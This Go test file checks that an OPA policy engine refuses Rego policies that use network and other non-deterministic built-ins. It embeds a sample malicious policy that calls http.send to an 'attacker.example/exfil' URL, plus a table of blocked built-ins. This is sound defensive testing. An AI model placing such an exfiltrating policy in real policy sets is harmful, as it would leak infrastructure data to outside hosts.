package opa

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// writePolicy writes a .rego file into a fresh temp dir and returns its path.
func writePolicy(t *testing.T, content string) string {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "policy.rego")
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatalf("failed to write policy: %v", err)
	}
	return path
}

// TestRestrictedCapabilities_StripsNonDeterministicBuiltins asserts the helper
// removes every non-deterministic built-in and locks down AllowNet.
func TestRestrictedCapabilities_StripsNonDeterministicBuiltins(t *testing.T) {
	caps := restrictedCapabilities()

	for _, b := range caps.Builtins {
		if b.Nondeterministic {
			t.Errorf("non-deterministic built-in %q survived the sandbox", b.Name)
		}
	}

	// AllowNet must be non-nil and empty: nil means "any host allowed".
	if caps.AllowNet == nil {
		t.Error("AllowNet is nil (any host allowed); expected empty slice")
	}
	if len(caps.AllowNet) != 0 {
		t.Errorf("AllowNet = %v; expected empty slice", caps.AllowNet)
	}

	// Sanity: a pure built-in policies actually use must still be present.
	found := false
	for _, b := range caps.Builtins {
		if b.Name == "sprintf" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected pure built-in sprintf to remain available")
	}
}

// TestEngine_RejectsHTTPSendPolicy proves a malicious policy that calls
// http.send is rejected at load/compile time, before any evaluation runs.
// This is the core exfiltration defense: a policy from an untrusted --policy
// directory cannot ship parsed infrastructure to an attacker.
func TestEngine_RejectsHTTPSendPolicy(t *testing.T) {
	evil := `package policyguard
import future.keywords.if

deny[violation] {
	resource := input.resource
	resp := http.send({"method": "get", "url": "http://attacker.example/exfil"})
	violation := {
		"id": "x",
		"policy_id": "evil",
		"severity": "low",
		"message": "exfil",
		"details": "",
		"remediation": "",
	}
}
`
	engine := New()
	err := engine.LoadPolicy(context.Background(), writePolicy(t, evil))
	if err == nil {
		t.Fatal("expected http.send policy to be rejected, but LoadPolicy succeeded")
	}
	if !strings.Contains(err.Error(), "http.send") {
		t.Errorf("error should name the offending built-in http.send; got: %v", err)
	}
}

// TestEngine_RejectsAllNonDeterministicBuiltins is a table-driven guard so the
// protection cannot silently regress for any one built-in.
func TestEngine_RejectsAllNonDeterministicBuiltins(t *testing.T) {
	calls := map[string]string{
		"http.send":              `http.send({"method": "get", "url": "http://x"})`,
		"net.lookup_ip_addr":     `net.lookup_ip_addr("example.com")`,
		"opa.runtime":            `opa.runtime()`,
		"rand.intn":              `rand.intn("k", 10)`,
		"time.now_ns":            `time.now_ns()`,
		"uuid.rfc4122":           `uuid.rfc4122("k")`,
		"io.jwt.encode_sign":     `io.jwt.encode_sign({"alg":"HS256"}, {}, {})`,
		"io.jwt.encode_sign_raw": `io.jwt.encode_sign_raw("h", "p", "k")`,
		"io.jwt.decode_verify":   `io.jwt.decode_verify("t", {})`,
	}

	for name, call := range calls {
		t.Run(name, func(t *testing.T) {
			policy := `package policyguard
deny[violation] {
	x := ` + call + `
	violation := {"id": "x", "policy_id": "p", "severity": "low", "message": "m", "details": "", "remediation": ""}
}
`
			engine := New()
			if err := engine.LoadPolicy(context.Background(), writePolicy(t, policy)); err == nil {
				t.Fatalf("expected policy using %s to be rejected, but it loaded", name)
			}
		})
	}
}

// TestEngine_AcceptsDeterministicPolicy is the true-negative: a normal policy
// using only pure built-ins must still load and evaluate.
func TestEngine_AcceptsDeterministicPolicy(t *testing.T) {
	good := `package policyguard
import future.keywords.if

deny[violation] {
	resource := input.resource
	resource.type == "aws_s3_bucket"
	not resource.attributes.server_side_encryption_configuration
	violation := {
		"id": sprintf("s3-no-encryption-%s", [resource.name]),
		"policy_id": "s3_bucket_encryption",
		"severity": "high",
		"message": sprintf("S3 bucket '%s' is not encrypted", [resource.name]),
		"details": "data at rest must be encrypted",
		"remediation": "add server_side_encryption_configuration",
	}
}
`
	engine := New()
	if err := engine.LoadPolicy(context.Background(), writePolicy(t, good)); err != nil {
		t.Fatalf("deterministic policy should load, got: %v", err)
	}
}
